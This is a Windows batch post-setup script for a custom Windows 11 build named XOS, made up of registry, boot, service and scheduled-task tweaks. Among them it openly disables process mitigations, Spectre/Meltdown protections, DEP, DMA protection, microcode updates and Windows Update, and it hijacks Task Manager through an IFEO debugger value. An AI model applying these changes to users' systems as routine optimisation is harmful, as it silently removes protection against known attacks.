@shift /0
@echo off
echo %date% - %time% Script Opened Successfully >> C:\log.txt
@title "XOS W11 V009 Post Setup"
SETLOCAL EnableDelayedExpansion

::CALLING IF INSTALLATION IS LEGIT
for /f "tokens=2* skip=2" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation" /v "Manufacturer"') do ( 
	if not "%%b"=="XOS by imribiy" ( call:unauthorized )
)
if not exist "C:\Users\Default\Desktop\WELCOME TO XOS.txt" ( call:unauthorized )
echo %date% - %time% Script Started Successfully >> C:\log.txt

::DISABLING TASK MANAGER TO PREVENT RANDOM ACCESS
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "." /f >nul 2>&1

echo x=msgbox("Don't touch anything, system will reboot itself after a while. XOS is a free operating system, ask for refund if you paid for it. Discord: imribiy" ,0, "Welcome to XOS") >> msgbox.vbs
start msgbox.vbs
TIMEOUT /T 0 /NOBREAK
del msgbox.vbs
cls

Echo "Installing Visual C Runtimes"
start /b /wait "" "C:\Modules\VisualCAIO\install_all.bat" >nul 2>&1
cls

echo %date% - %time% Visual C Packages Installed >> C:\log.txt

echo "Enabling legacy photo viewer"
::Credits to Zusier
for %%a in (tif tiff bmp dib gif jfif jpe jpeg jpg jxr png) do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".%%~a" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
)

echo "Disabling Process Mitigations"
powershell "ForEach($v in (Get-Command -Name \"Set-ProcessMitigation\").Parameters[\"Disable\"].Attributes.ValidValues){Set-ProcessMitigation -SYSTEM -Disable $v.ToString() -ErrorAction SilentlyContinue}"
cls
for /f "tokens=3 skip=2" %%a in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationAuditOptions"') do set mitigation_mask=%%a
for /L %%a in (0,1,9) do (
    set "mitigation_mask=!mitigation_mask:%%a=2!
)
for %%a in (
	fontdrvhost.exe
	dwm.exe
	lsass.exe
	svchost.exe
	WmiPrvSE.exe
	winlogon.exe
	csrss.exe
	audiodg.exe
	ntoskrnl.exe
	services.exe
) do (
	Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%a" /v "MitigationOptions" /t REG_BINARY /d "!mitigation_mask!" /f > NUL 2>&1
	Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%a" /v "MitigationAuditOptions" /t REG_BINARY /d "!mitigation_mask!" /f > NUL 2>&1
)
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationOptions" /t REG_BINARY /d "!mitigation_mask!" /f > NUL 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationAuditOptions" /t REG_BINARY /d "!mitigation_mask!" /f > NUL 2>&1
cls

echo %date% - %time% Mitigations Disabled >> C:\log.txt

echo "Theme settings"
Reg.exe add "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_BINARY /d "9012038010000000" /f
Reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "SystemUsesLightTheme" /t REG_DWORD /d "0" /f
cls

echo "Audio settings"
Reg.exe add "HKCU\SOFTWARE\Microsoft\Multimedia\Audio" /v "UserDuckingPreference" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Multimedia\Audio\DeviceCpl" /v "ShowHiddenDevices" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Multimedia\Audio\DeviceCpl" /v "ShowDisconnectedDevices" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Multimedia\Audio\DeviceCpl" /v "VolumeUnits" /t REG_DWORD /d "0" /f
cls

echo "Optimizing Scheduled Tasks"
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\Defrag\ScheduledDefrag" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\DiskFootprint\Diagnostics" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\InstallService\ScanForUpdates" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\InstallService\ScanForUpdatesAsUser" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\InstallService\SmartRetry" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\Registry\RegIdleBackup" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\WDI\ResolutionHost" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\Windows Error Reporting\QueueReporting" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\SettingSync\BackgroundUploadTask" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\SettingSync\NetworkStateChangeTask" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\Shell\ThemesSyncedImageDownload" >nul 2>&1
powerrun "schtasks.exe" /change /disable /TN "\Microsoft\Windows\RemoteAssistance\RemoteAssistanceTask" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\WaaSMedic" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\WindowsUpdate" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\WindowsUpdate\Scheduled Start" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Wake To Work" >nul 2>&1
powerrun "schtasks.exe" /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Start Oobe Expedite Work" >nul 2>&1
cls

echo %date% - %time% Scheduled Tasks Optimized >> C:\log.txt

echo "Optimizing bcdedit entries"
bcdedit /deletevalue useplatformclock
bcdedit /set disabledynamictick yes
:: useplatformtick yes hurts performance and sleeping on w11
:: bcdedit /set useplatformtick yes
bcdedit /set bootmenupolicy legacy
bcdedit /timeout 10
bcdedit /set nx alwaysoff
bcdedit /set {globalsettings} custom:16000067 true
bcdedit /set {globalsettings} custom:16000068 true
bcdedit /set {globalsettings} custom:16000069 true
label C: XOS
bcdedit /set {current} description "XOS-W11-009"
cls

echo %date% - %time% BCDEdit settings optimized >> C:\log.txt

echo "Disabling Dma Remapping"
::https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DmaGuard\DeviceEnumerationPolicy" /v "value" /t REG_DWORD /d "2" /f
for /f %%i in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" /s /f DmaRemappingCompatible ^| find /i "Services\" ') do (
	echo %%i...
	Reg.exe add "%%i" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
)
cls

Echo "Tweaking NIC"
::Thanks to gosheto
for /f %%a in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}" /v "*SpeedDuplex" /s ^| findstr  "HKEY"') do (
    for /f %%i in ('reg query "%%a" /v "*DeviceSleepOnDisconnect" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "*DeviceSleepOnDisconnect" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*EEE" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "*EEE" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*ModernStandbyWoLMagicPacket" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "*ModernStandbyWoLMagicPacket" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*SelectiveSuspend" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "*SelectiveSuspend" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*WakeOnMagicPacket" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "*WakeOnMagicPacket" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*WakeOnPattern" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "*WakeOnPattern" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "AutoPowerSaveModeEnabled" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "AutoPowerSaveModeEnabled" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "EEELinkAdvertisement" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "EEELinkAdvertisement" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "EeePhyEnable" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "EeePhyEnable" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "EnableGreenEthernet" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "EnableGreenEthernet" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "EnableModernStandby" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "EnableModernStandby" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "GigaLite" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "GigaLite" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "PnPCapabilities" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "PnPCapabilities" /t REG_DWORD /d "24" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "PowerDownPll" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "PowerDownPll" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "PowerSavingMode" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "PowerSavingMode" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "ReduceSpeedOnPowerDown" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "ReduceSpeedOnPowerDown" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "S5WakeOnLan" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "S5WakeOnLan" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "SavePowerNowEnabled" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "SavePowerNowEnabled" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "ULPMode" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "ULPMode" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "WakeOnLink" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "WakeOnLink" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "WakeOnSlot" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "WakeOnSlot" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "WakeUpModeCap" ^| findstr "HKEY"') do (
        Reg.exe add "%%i" /v "WakeUpModeCap" /t REG_SZ /d "0" /f >nul 2>&1
    )
) >nul 2>&1
cls

echo %date% - %time% NIC Settings optimized >> C:\log.txt

echo "Disabling Unnecessary Network Adapter Items"
powershell disable-netadapterbinding -name "*" -componentid vmware_bridge, ms_lldp, ms_lltdio, ms_implat, ms_tcpip6, ms_rspndr, ms_server, ms_msclient
cls

echo %date% - %time% Network adapters disabled >> C:\log.txt

echo "Disabling hiberboot, leaving it enable causes pc not to shut down"
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
cls

echo "Disable Spectre and meltdown"
::Credits to privacy.sexy
wmic cpu get name | findstr "Intel" >nul && (
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d 0 /f
)
wmic cpu get name | findstr "AMD" >nul && (
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d 64 /f
)
cls

echo "Disabling Useless Device Manager Devices"
devmanview /disable "Direct memory access Controller"
devmanview /disable "High Precision Event Timer"
devmanview /disable "Microsoft GS Wavetable Synth"
devmanview /disable "System timer"
devmanview /disable "Remote Desktop Device Redirector Bus"
devmanview /disable "NDIS Virtual Network Adapter Enumerator"
devmanview /disable "Microsoft Virtual Drive Enumerator"
devmanview /disable "UMBus Root Bus Enumerator"
cls

echo %date% - %time% Device Manager Optimized >> C:\log.txt

echo "Creating Default Services Backup"
sc config wlansvc start=auto
set BACKUP="C:\Windows\service-backups\windows-default-services.reg"
echo Windows Registry Editor Version 5.00 >>%BACKUP%

for /f "delims=" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services"') do (
	for /f "tokens=3" %%b in ('reg query "%%~a" /v "Start" 2^>nul') do (
		for /l %%c in (0,1,4) do (
			if "%%b"=="0x%%c" (
				echo. >>%BACKUP%
				echo [%%~a] >>%BACKUP%
				echo "Start"=dword:0000000%%c >>%BACKUP%
			) 
		) 
	) 
) >nul 2>&1
cls

echo %date% - %time% Windows default services created >> C:\log.txt

echo "Disabling Drivers and Services"
PowerRun.exe /SW:0 Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{71a27cdd-812a-11d0-bec7-08002be2092f}" /v "LowerFilters" /t REG_MULTI_SZ /d "" /f
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dhcp" /v "DependOnService" /t REG_MULTI_SZ /d "NSI\0Afd" /f
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache" /v "DependOnService" /t REG_MULTI_SZ /d "nsi" /f
for %%z in (
	afunix
	bam
	cldflt
	lltdio
	mslldp
	sgrmagent
	sgrmbroker
	themes
	beep
	pcasvc
	fontcache
	fontcache3.0.0.0
	sysmain
	rdyboost
	spooler
	cscservice
	csc
	iphlpsvc
	trkwks
	ssdpsrv
	sstpsvc
	dusmsvc
	lfsvc
	gpuenergydrv
	cdrom
	xblauthmanager
	xblgamesave
	xboxgipsvc
	xboxnetapisvc
	sensrsvc
	sensordataservice
	sensorservice
	dps
	wdisystemhost
	wdiservicehost
	diagtrack
	dssvc
	dusmsvc
	diagsvc
	telemetry
	diagnosticshub.standardcollector.service
	onesyncsvc
	termservice
	umrdpservice
	winrm
	rdpbus
	rdpdr
	rdpvideominiport
	terminpt
	tsusbflt
	tsusbgd
	tsusbhub
	umbus
	ndisvirtualbus
	vdrvroot
	cbdhsvc
	netbios
	netbt
) do (
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\%%z" /v "Start" /t REG_DWORD /d "4" /f
)
cls

echo %date% - %time% Services disabled >> C:\log.txt

echo "Importing Power Plan"
powercfg -import "C:\Windows\imribiy.pow" c06825f9-80a0-4beb-9c81-de332809e623
wevtutil sl Microsoft-Windows-SleepStudy/Diagnostic /e:false >nul 2>&1
wevtutil sl Microsoft-Windows-Kernel-Processor-Power/Diagnostic /e:false >nul 2>&1
wevtutil sl Microsoft-Windows-UserModePowerService/Diagnostic /e:false >nul 2>&1
cls

echo %date% - %time% Powerplan imported >> C:\log.txt

echo "Optimizing NTFS file system parameters"
fsutil behavior set disable8dot3 1
fsutil behavior set disabledeletenotify 0
fsutil behavior set disablelastaccess 1
cls

echo %date% - %time% fsutil optimized >> C:\log.txt

echo "Disabling powersaving features"
::Thanks to AMITXV
for %%a in (
	EnhancedPowerManagementEnabled
	AllowIdleIrpInD3
	EnableSelectiveSuspend
	DeviceSelectiveSuspended
	SelectiveSuspendEnabled
	SelectiveSuspendOn
	WaitWakeEnabled
	D3ColdSupported
	WdfDirectedPowerTransitionEnable
	EnableIdlePowerManagement
	IdleInWorkingState
) do for /f "delims=" %%b in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum" /s /f "%%a" ^| findstr "HKEY"') do Reg.exe add "%%b" /v "%%a" /t REG_DWORD /d "0" /f > NUL 2>&1
cls

echo "Disabling NetBIOS over TCP/IP"
for /f "delims=" %%u in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces" /s /f "NetbiosOptions" ^| findstr "HKEY"') do (
    reg add "%%u" /v "NetbiosOptions" /t REG_DWORD /d "2" /f
)
cls

echo "Creating Default Services Backup"
set BACKUP="C:\Windows\service-backups\xos-default-services.reg"
echo Windows Registry Editor Version 5.00 >>%BACKUP%

for /f "delims=" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services"') do (
	for /f "tokens=3" %%b in ('reg query "%%~a" /v "Start" 2^>nul') do (
		for /l %%c in (0,1,4) do (
			if "%%b"=="0x%%c" (
				echo. >>%BACKUP%
				echo [%%~a] >>%BACKUP%
				echo "Start"=dword:0000000%%c >>%BACKUP%
			) 
		) 
	) 
) >nul 2>&1
cls

echo %date% - %time% XOS Default services created >> C:\log.txt

echo "Disabling variable services"
for /F "tokens=* skip=1" %%n in ('wmic SYSTEMenclosure get ChassisTypes ^| findstr "."') do set ChassisTypes=%%n
set ChassisTypes=%ChassisTypes:{=% 
set /a ChassisTypes=%ChassisTypes:}=%
if %ChassisTypes% LEQ 7 goto A
if %ChassisTypes% GTR 7 goto B

:A
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DisplayEnhancementService" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
powercfg /s c06825f9-80a0-4beb-9c81-de332809e623
cls
goto end

:B
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\serenum" /v "Start" /t REG_DWORD /d "3" /f >nul 2>&1
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sermouse" /v "Start" /t REG_DWORD /d "3" /f >nul 2>&1
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\serial" /v "Start" /t REG_DWORD /d "3" /f >nul 2>&1
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wlansvc" /v "Start" /t REG_DWORD /d "2" /f >nul 2>&1
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wmiacpi" /v "Start" /t REG_DWORD /d "2" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "0" /f
powercfg -duplicatescheme a1841308-3541-4fab-bc81-f71556f20b4a
goto end
cls

:end
echo "Changing Time Provider to ntp.org"
::Credits to privacy.sexy
w32tm /config /syncfromflags:manual /manualpeerlist:"0.pool.ntp.org 1.pool.ntp.org 2.pool.ntp.org 3.pool.ntp.org"
cls

echo "Renaming microcodes"
cd C:\Windows\System32
takeown /f "mcupdate_AuthenticAMD.dll"
icacls "C:\Windows\System32\mcupdate_AuthenticAMD.dll" /grant Administrators:F
ren mcupdate_AuthenticAMD.dll mcupdate_AuthenticAMD.old
takeown /f "mcupdate_GenuineIntel.dll"
icacls "C:\Windows\System32\mcupdate_GenuineIntel.dll" /grant Administrators:F
ren mcupdate_GenuineIntel.dll mcupdate_GenuineIntel.old
cls

echo %date% - %time% Microcodes disabled >> C:\log.txt

echo "Forcing Pause Automatic Update"
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ForcePauseUpdate" /t REG_SZ /d "Regedit.exe /s \"C:\Windows\forcepauseupdate.reg\"" /f
cls

echo "Disabling XBox GameBar"
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "GamePanelStartupTipIndex" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "ShowStartupPanel" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "UseNexusForGameBarEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
cls

echo "Disabling Feeds, because randomly pops out"
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Feeds" /f
cls

echo "Welcome Message"
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Welcome" /t REG_SZ /d "\"C:\Users\Default\Desktop\WELCOME TO XOS.txt\"" /f
cls

echo "Setting Timer Resolution"
;;https://github.com/amitxv/TimerResolution
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TimerResolution" /t REG_SZ /d "C:\Windows\timerres.exe --resolution 5070 --no-console" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f
cls

echo disable automatic time sync
Reg.exe add "HKLM\System\ControlSet001\Services\W32Time\Parameters" /v "Type" /t REG_SZ /d "NoSync" /f
cls

echo This reg file implements all the changes can be done on Steam by regedit to achieve better gaming performance. By imribiy#0001
Reg.exe add "HKCU\SOFTWARE\Valve\Steam" /v "SmoothScrollWebViews" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Valve\Steam" /v "DWriteEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Valve\Steam" /v "StartupMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Valve\Steam" /v "H264HWAccel" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Valve\Steam" /v "DPIScaling" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Valve\Steam" /v "GPUAccelWebViews" /t REG_DWORD /d "0" /f
cls

echo svchost to maximum
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "4294967295" /f
cls

echo disable retrieval of online tips and help in the immersive control panel
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "AllowOnlineTips" /t REG_DWORD /d "0" /f
cls

echo disable suggestions in the search box and in search home
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SearchSettings" /v "IsDynamicSearchBoxEnabled" /t REG_DWORD /d "0" /f
cls

echo disable automatic maintenance
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
cls

echo allocate processor resources primarily to programs
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
cls

echo disable fault tolerant heap
Reg.exe add "HKLM\SOFTWARE\Microsoft\FTH" /v "Enabled" /t REG_DWORD /d "0" /f
cls

echo disable sticky keys
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "506" /f
cls

echo disable powershell telemetry
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "POWERSHELL_TELEMETRY_OPTOUT" /t REG_SZ /d "1" /f
cls

echo reserve 10% of CPU resources for low-priority tasks instead of the default 20%
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f
cls

echo disable remote assistance
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v "fAllowToGetHelp" /t REG_DWORD /d "0" /f
cls

echo disable search the web or display web results in Search
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
cls

echo disable notifications network usage
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoCloudApplicationNotification" /t REG_DWORD /d "1" /f
cls

echo taskbar location hide chat widgets task view
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAl" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarDa" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarMn" /t REG_DWORD /d "0" /f
